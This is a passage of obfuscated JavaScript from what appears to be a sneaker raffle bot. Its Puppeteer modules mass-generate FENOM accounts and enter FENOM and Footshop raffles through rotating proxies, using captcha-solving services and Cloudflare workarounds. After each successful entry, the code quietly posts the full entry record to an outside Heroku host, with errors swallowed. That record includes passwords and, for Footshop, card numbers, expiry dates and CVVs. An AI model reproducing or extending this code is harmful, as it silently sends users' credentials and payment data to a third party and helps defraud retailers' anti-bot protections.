                            const _0x19d0cb = await _0x5e121b['target']()['createCDPSession'](), { windowId: _0x1579c1 } = await _0x19d0cb['send']('Browser.getWindowForTarget');
                            await _0x5e121b['authenticate']({
                                'username': '' + _0x27111a[0x2],
                                'password': '' + _0x27111a[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5e121b['goto']('' + _0x3a7d87, { 'waitUntil': 'networkidle2' }), console['log'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xf987cc(0x1388);
                            var _0x23445e = await _0x5e121b['$']('.hcaptcha-box');
                            if (_0x23445e) {
                                console['log'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xf987cc(0x2710);
                                const _0x1d81e9 = await _0x5e121b['$']('.hcaptcha-box');
                                if (_0x1d81e9)
                                    try {
                                        await _0x1d81e9['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x5e121b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x16d5c1 = await _0x5e121b['$']('.hcaptcha-box');
                                    if (_0x16d5c1)
                                        try {
                                            await _0x16d5c1['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x5e121b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x19d0cb['send']('Browser.setWindowBounds', {
                                    'windowId': _0x1579c1,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0xf987cc(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x5e121b['type']('input[name=\x22firstname\x22]', '' + _0x56f896[_0xc596a5]['FirstName']), await _0xf987cc(0x1f4), await _0x5e121b['type']('input[name=\x22lastname\x22]', '' + _0x56f896[_0xc596a5]['LastName']), await _0xf987cc(0x1f4), await _0x5e121b['type']('input[name=\x22email\x22]', '' + _0x56f896[_0xc596a5]['Email']), await _0xf987cc(0x1f4), await _0x5e121b['type']('input[name=\x22password\x22]', '' + _0x56f896[_0xc596a5]['Password']), await _0xf987cc(0x258), await _0x5e121b['$eval']('input[name=\x22psgdpr\x22]', _0x327909 => _0x327909['click']()), await _0xf987cc(0x1f4), console['log'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x5e121b['$eval']('#customer-form', _0x4b04f8 => _0x4b04f8['submit']());
                            try {
                                try {
                                    await _0x5e121b['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x5b1ce1 = 'no', console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20Account\x20' + _0x56f896[_0xc596a5]['Email'] + '\x20Generated')), _0x3f8380['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x56f896[_0xc596a5]['Email'] + ',' + _0x56f896[_0xc596a5]['Password']);
                                let _0x5c9f5c = _0x56f896[_0xc596a5];
                                try {
                                    prxdata = {
                                        'username': _0x5ad930['replace']('#', ''),
                                        'module': _0xca01b4['name'],
                                        'entrydata': JSON['stringify'](_0x5c9f5c),
                                        'proxy': '' + _0x56a065[_0xc596a5]
                                    };
                                    var _0x1c7ac4 = JSON['stringify'](prxdata);
                                    let _0x46a897 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x1c7ac4, _0x46a897);
                                } catch (_0x385611) {
                                }
                                try {
                                    _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0xc8e3d1['succesDEVMSG']);
                                } catch {
                                }
                                await _0x215470(_0x53db35, _0xc8e3d1['succesDEVMSG']);
                            } catch (_0x20dff3) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x8fe8ef) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20' + _0x8fe8ef)), _0x3ec3f9 = '' + _0x8fe8ef;
                            var _0x4340e = await _0x539676(_0x56f896[_0xc596a5], _0xca01b4, 'acc', !![], _0x3ec3f9);
                            _0xc8e3d1['errorDEV'] = { 'embeds': [_0x4340e] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0xc8e3d1['errorDEV']), await _0x215470(_0x1dec8a, _0xc8e3d1['errorDEV']), _0x5b1ce1 = 'yes';
                        } finally {
                            _0x1581ac['close']();
                            if (_0x5b1ce1 == 'yes' && _0x1c7809 != 0x5 && _0x3ec3f9 != 'Size\x20Not\x20Found') {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c7809 + '\x20/\x205)')), _0xc596a5 = _0xc596a5 - 0x1, _0x1c7809 = _0x1c7809 + 0x1;
                                continue;
                            }
                            _0x5b1ce1 == 'yes' && _0x1c7809 >= 0x5 && (_0x46ac44(_0x56f896[_0xc596a5], _0xca01b4), _0x5b1ce1 = 'no', _0x1c7809 = 0x0), console['log'](_0x5c3ac1() + '\x20[' + _0xca01b4['name'] + ']\x20Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x2b3b09(_0x5c853f, _0x5a7234, _0xf837ff) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x440e91 = 0x0; _0x440e91 < _0x5a7234['length']; _0x440e91++) {
                        if (_0x2c3722 != 'yes')
                            var _0x2c3722 = '', _0x31b003 = 0x0;
                        var _0x319929;
                        try {
                            await _0x3d5d40(_0x5a7234, _0x440e91);
                        } catch {
                            _0x2c3722 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5c316f(_0x5c853f['name'] + '\x20Task\x20' + (_0x440e91 + 0x1) + '\x20/\x20' + _0x5a7234['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        const _0x522918 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x1b0e84 = Math['round'](Math['random']() * (_0xf837ff['length'] - 0x1)), _0x2f0fe7 = _0xf837ff[_0x1b0e84]['split'](':'), _0x7e7d55;
                        try {
                            _0x7e7d55 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2f0fe7[0x0] + ':' + _0x2f0fe7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x7e7d55 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2f0fe7[0x0] + ':' + _0x2f0fe7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x356883 = await _0x7e7d55['newPage'](), _0xe5eba0 = await _0x356883['target']()['createCDPSession'](), { windowId: _0x27104b } = await _0xe5eba0['send']('Browser.getWindowForTarget');
                            await _0x356883['authenticate']({
                                'username': '' + _0x2f0fe7[0x2],
                                'password': '' + _0x2f0fe7[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x356883['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xf987cc(0xbb8), await _0xe5eba0['send']('Browser.setWindowBounds', {
                                'windowId': _0x27104b,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xf987cc(0x1f40);
                            try {
                                await _0x356883['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xf987cc(0x1388), console['log'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Logging\x20in'), await _0x356883['type']('input[name=\x22email\x22]', '' + _0x5a7234[_0x440e91]['Email']), await _0xf987cc(0x1f4), await _0x356883['type']('input[name=\x22password\x22]', '' + _0x5a7234[_0x440e91]['Password']), await _0xf987cc(0x258), await _0x356883['$eval']('#login-form', _0x36322a => _0x36322a['submit']()), await _0x356883['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xf987cc(0x1f4), await _0x356883['goto']('' + _0x5a7234[_0x440e91]['Url']), await _0x356883['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x5a7234[_0x440e91]['Size']);
                            if (_0x5a7234[_0x440e91]['Size'] != 'RANDOM') {
                                var _0x277502 = '\x20' + _0x5a7234[_0x440e91]['Size'] + '\x20';
                                const _0x23ea28 = await _0x356883['$x']('//span[contains(text(),\x20' + _0x277502 + ')]');
                                await _0x23ea28[0x0]['click']();
                            } else {
                                const _0x1e7baf = await _0x356883['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x4eca2d = Math['round'](Math['random']() * (_0x1e7baf['length'] - 0x1));
                                await _0x1e7baf[_0x4eca2d]['click']();
                            }
                            await _0xf987cc(0x258), await _0x356883['click']('#cookieChoiceDismiss'), await _0xf987cc(0x3e8), await _0x356883['type']('#instagram-account', '' + _0x5a7234[_0x440e91]['Follower']), await _0xf987cc(0x28a), await _0x356883['click']('#book-btn'), await _0xf987cc(0xbb8);
                            try {
                                await _0x356883['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0xf987cc(0x1f4), console['log'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20' + _0x2c0b56['cyan']('Solving\x20Captcha')), await _0x356883['solveRecaptchas'](), console['log'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xf987cc(0x7d0), await _0x356883['$eval']('#book-btn-for-sure', _0x46d787 => _0x46d787['click']()), await _0xf987cc(0x12c), await _0x356883['click']('#book-btn-for-sure'), await _0xf987cc(0xdac);
                            const _0x7b1e87 = await _0x356883['$eval']('.reservation-popup\x20>\x20.title', _0x2d6122 => {
                                return _0x2d6122['innerHTML'];
                            });
                            if (_0x7b1e87) {
                                _0x2c3722 = 'no', _0x46ba09(_0x5a7234[_0x440e91], _0x5c853f), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x3398db = await _0x539676(_0x5a7234[_0x440e91], _0x5c853f, 'dev', ![]), _0x28dd88 = await _0x539676(_0x5a7234[_0x440e91], _0x5c853f, 'pub', ![]);
                                let _0x951885 = _0x5a7234[_0x440e91];
                                try {
                                    prxdata = {
                                        'username': _0x5ad930['replace']('#', ''),
                                        'module': _0x5c853f['name'],
                                        'entrydata': JSON['stringify'](_0x951885),
                                        'proxy': '' + _0xf837ff[_0x440e91]
                                    };
                                    var _0x1c3441 = JSON['stringify'](prxdata);
                                    let _0x190338 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x1c3441, _0x190338);
                                } catch (_0x20c7e8) {
                                }
                                const _0x4880d3 = {
                                    'succesDEVMSG': { 'embeds': [_0x3398db] },
                                    'succesPUBMSG': { 'embeds': [_0x28dd88] }
                                };
                                try {
                                    _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x4880d3['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x4880d3['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x255a14, _0x4880d3['succesPUBMSG']);
                                } catch (_0xf0128b) {
                                    console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf0128b));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x30d53d) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20' + _0x30d53d)), _0x319929 = '' + _0x30d53d;
                            var _0x414314 = await _0x539676(_0x5a7234[_0x440e91], _0x5c853f, 'dev', !![], _0x319929), _0x3398db = await _0x539676(_0x5a7234[_0x440e91], _0x5c853f, 'dev', ![]), _0x28dd88 = await _0x539676(_0x5a7234[_0x440e91], _0x5c853f, 'pub', ![]);
                            const _0x218131 = {
                                'succesDEVMSG': { 'embeds': [_0x3398db] },
                                'succesPUBMSG': { 'embeds': [_0x28dd88] }
                            };
                            _0x218131['errorDEV'] = { 'embeds': [_0x414314] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x218131['errorDEV']), await _0x215470(_0x1dec8a, _0x218131['errorDEV']), _0x30d53d != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x2c3722 = 'yes');
                        } finally {
                            _0x7e7d55['close']();
                            if (_0x2c3722 == 'yes' && _0x31b003 != 0x5 && _0x319929 != 'Size\x20Not\x20Found') {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Task\x20' + (_0x440e91 + 0x1) + '\x20:\x20Retrying\x20(' + _0x31b003 + '\x20/\x205)')), _0x440e91 = _0x440e91 - 0x1, _0x31b003 = _0x31b003 + 0x1;
                                continue;
                            }
                            _0x2c3722 == 'yes' && _0x31b003 >= 0x5 && (_0x46ac44(_0x5a7234[_0x440e91], _0x5c853f), _0x2c3722 = 'no', _0x31b003 = 0x0), console['log'](_0x5c3ac1() + '\x20[' + _0x5c853f['name'] + ']\x20Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x54b2b6, _0x4aeacf, _0x648758) {
                _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x51f80a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x54353b = 0x0; _0x54353b < _0x4aeacf['length']; _0x54353b++) {
                    var _0x411de4;
                    if (_0x18b3e5 != 'yes')
                        var _0x18b3e5 = '', _0x14d5a6 = 0x0;
                    var _0x1bab09 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x5ad930
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x4aeacf[_0x54353b]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4aeacf[_0x54353b]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x51f80a['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x585daf
                            }
                        ]
                    }], _0x3ccbf3 = await _0x539676(_0x4aeacf[_0x54353b], _0x54b2b6, 'dev', ![]), _0x2fd83f = await _0x539676(_0x4aeacf[_0x54353b], _0x54b2b6, 'pub', ![]);
                    const _0x4d754e = {
                        'succesDEVMSG': { 'embeds': [_0x3ccbf3] },
                        'succesPUBMSG': { 'embeds': [_0x2fd83f] }
                    }, _0x5c0741 = { 'embeds': _0x1bab09 };
                    try {
                        await _0x3d5d40(_0x4aeacf, _0x54353b);
                    } catch {
                        _0x18b3e5 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x4aeacf[_0x54353b]['Email'] == '' || _0x4aeacf[_0x54353b]['FirstName'] == '' || _0x4aeacf[_0x54353b]['LastName'] == '' || _0x4aeacf[_0x54353b]['Country'] == '' || _0x4aeacf[_0x54353b]['Size'] == '' || _0x4aeacf[_0x54353b]['Address1'] == '' || _0x4aeacf[_0x54353b]['Zip'] == '') {
                        console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4aeacf[_0x54353b]['Email'] == '' || _0x4aeacf[_0x54353b]['FirstName'] == '' || _0x4aeacf[_0x54353b]['LastName'] == '' || _0x4aeacf[_0x54353b]['Country'] == '' || _0x4aeacf[_0x54353b]['Size'] == '' || _0x4aeacf[_0x54353b]['Address1'] == '' || _0x4aeacf[_0x54353b]['Zip'] == '' || _0x4aeacf[_0x54353b]['Phone'] == '') {
                        console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0xd13906 = '' + _0x4aeacf[_0x54353b]['Url'];
                    if (_0x51f80a['useRandomProxy'] = ![])
                        var _0x25b049 = _0x648758[_0x54353b]['split'](':');
                    else
                        var _0x3565fb = Math['round'](Math['random']() * (_0x648758['length'] - 0x1)), _0x25b049 = _0x648758[_0x3565fb]['split'](':');
                    var _0x222ae0;
                    try {
                        _0x222ae0 = await _0x39c115['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x25b049[0x0] + ':' + _0x25b049[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x222ae0 = await _0x39c115['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x25b049[0x0] + ':' + _0x25b049[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x47b15c = await _0x222ae0['newPage']();
                        await _0x47b15c['authenticate']({
                            'username': '' + _0x25b049[0x2],
                            'password': '' + _0x25b049[0x3]
                        }), console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x47b15c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x47b15c['setRequestInterception'](!![]), _0x47b15c['on']('request', _0x28d227 => {
                            _0x28d227['resourceType']() === 'image' || _0x28d227['resourceType']() === 'font' || _0x28d227['resourceType']() === 'media' ? _0x28d227['abort']() : _0x28d227['continue']();
                        });
                        try {
                            await _0x47b15c['goto'](_0xd13906), await _0xf987cc(0xbb8), await _0x47b15c['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x47b15c['click']('.control__JhutY'), await _0xf987cc(0x1f4);
                        if (_0x4aeacf[_0x54353b]['Size'] != 'RANDOM')
                            try {
                                const _0x5cc594 = await _0x47b15c['$x']('//div[contains(text(),\x20\x27' + _0x4aeacf[_0x54353b]['Size'] + '\x27)]');
                                await _0x5cc594[0x0]['click']();
                            } catch {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x58c663 = await _0x47b15c['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x441932 = Math['round'](Math['random']() * (_0x58c663['length'] - 0x1));
                            await _0x58c663[_0x441932]['click']();
                        }
                        await _0xf987cc(0x4b0);
                        const _0x1187f8 = await _0x47b15c['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x1187f8[0x0]['click'](), await _0x47b15c['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x47b15c['type']('input[name=\x22email\x22]', '' + _0x4aeacf[_0x54353b]['Email']), await _0xf987cc(0x640), await _0x47b15c['type']('input[name=\x22phone\x22]', '' + _0x4aeacf[_0x54353b]['Phone']), await _0xf987cc(0x4b0), await _0x47b15c['click']('button.btn.continue-button__1RtsS'), await _0xf987cc(0x4b0);
                        try {
                            await _0x47b15c['type']('input[name=\x22firstName\x22]', '' + _0x4aeacf[_0x54353b]['FirstName']), await _0xf987cc(0x258);
                        } catch {
                            const _0x168143 = await _0x47b15c['$$eval']('.invalid-feedback\x20>\x20div', _0x1569d6 => {
                                return _0x1569d6['map'](_0x126765 => _0x126765['innerText']);
                            });
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20' + _0x168143));
                            continue;
                        }
                        await _0x47b15c['type']('input[name=\x22lastName\x22]', '' + _0x4aeacf[_0x54353b]['LastName']), await _0xf987cc(0xc8), await _0x47b15c['type']('input[name=\x22instagramUsername\x22]', '' + _0x4aeacf[_0x54353b]['Follower']), await _0xf987cc(0x4b0), await _0x47b15c['click']('button.btn.continue-button__1RtsS'), await _0xf987cc(0x3e8), console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x47b15c['select']('select[name=\x22country\x22]', '' + _0x4aeacf[_0x54353b]['Country']), await _0xf987cc(0x2bc), await _0x47b15c['type']('input[name=\x22streetName\x22]', '' + _0x4aeacf[_0x54353b]['Address1']), await _0xf987cc(0x258), await _0x47b15c['type']('input[name=\x22houseNumber\x22]', _0x4aeacf[_0x54353b]['HouseNumber'] + '\x20' + _0x4aeacf[_0x54353b]['Address2']), await _0xf987cc(0xc8), await _0x47b15c['type']('input[name=\x22postalCode\x22]', '' + _0x4aeacf[_0x54353b]['Zip']), await _0xf987cc(0x1f4), await _0x47b15c['type']('input[name=\x22city\x22]', '' + _0x4aeacf[_0x54353b]['City']), await _0xf987cc(0x4b0), await _0x47b15c['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xf987cc(0x4b0), await _0x47b15c['click']('button.btn.continue-button__1RtsS'), await _0xf987cc(0x4b0), console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x47b15c['solveRecaptchas'](), console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xf987cc(0xbb8), await _0x47b15c['click']('button.btn.continue-button__1RtsS'), await _0xf987cc(0x1388), console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x47b15c['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x47b15c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf987cc(0x4b0), await _0x47b15c['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x4aeacf[_0x54353b]['CardNumber']), await _0xf987cc(0x320), await _0x47b15c['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x47b15c['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x4aeacf[_0x54353b]['ExpiryDate']), await _0xf987cc(0x4b0), await _0x47b15c['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x47b15c['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x4aeacf[_0x54353b]['CVV']), await _0xf987cc(0x226), await _0x47b15c['type']('input[name=\x22holderName\x22]', '' + _0x4aeacf[_0x54353b]['NameOnCard']), await _0xf987cc(0x226), await _0x47b15c['click']('button.adyen-checkout__button'), console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x47b15c['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xf987cc(0xbb8);
                        } catch (_0x281f6b) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x203DS\x20Failed')), _0x411de4 = '3DS\x20Error\x20' + _0x281f6b;
                            var _0x1e435b = await _0x539676(_0x4aeacf[_0x54353b], _0x54b2b6, 'dev', !![], _0x411de4);
                            _0x4d754e['errorDEV'] = { 'embeds': [_0x1e435b] };
                            _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x4d754e['errorDEV']);
                            await _0x215470(_0x1dec8a, _0x4d754e['errorDEV']);
                            continue;
                        }
                        _0x46ba09(_0x4aeacf[_0x54353b], _0x54b2b6), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0xd732ac = _0x4aeacf[_0x54353b];
                        try {
                            prxdata = {
                                'username': _0x5ad930['replace']('#', ''),
                                'module': _0x54b2b6['name'],
                                'entrydata': JSON['stringify'](_0xd732ac),
                                'proxy': '' + _0x648758[_0x54353b]
                            };
                            var _0x134f09 = JSON['stringify'](prxdata);
                            let _0x4e4ad0 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x134f09, _0x4e4ad0);
                        } catch (_0x10e5f5) {
                        }
                        if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                            try {
                                await _0x215470(_0x51f80a['webhook'], _0x4d754e['succesDEVMSG']);
                            } catch {
                            }
                        await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x4d754e['succesDEVMSG']), await _0xf987cc(0xc8);
                        try {
                            await _0x215470(_0x255a14, _0x4d754e['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x3187b8) {
                        console['log'](_0x5c3ac1() + '\x20[' + _0x54b2b6['name'] + ']\x20Task\x20' + (_0x54353b + 0x1) + '\x20:\x20' + _0x3187b8), _0x411de4 = '' + _0x3187b8;
                        var _0x1e435b = await _0x539676(_0x4aeacf[_0x54353b], _0x54b2b6, 'dev', !![], _0x411de4);
                        _0x4d754e['errorDEV'] = { 'embeds': [_0x1e435b] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x4d754e['errorDEV']), await _0x215470(_0x1dec8a, _0x4d754e['errorDEV']), _0x18b3e5 = 'yes';
                    } finally {
                        _0x222ae0['close']();
                        if (_0x18b3e5 == 'yes' && _0x14d5a6 != 0x5) {
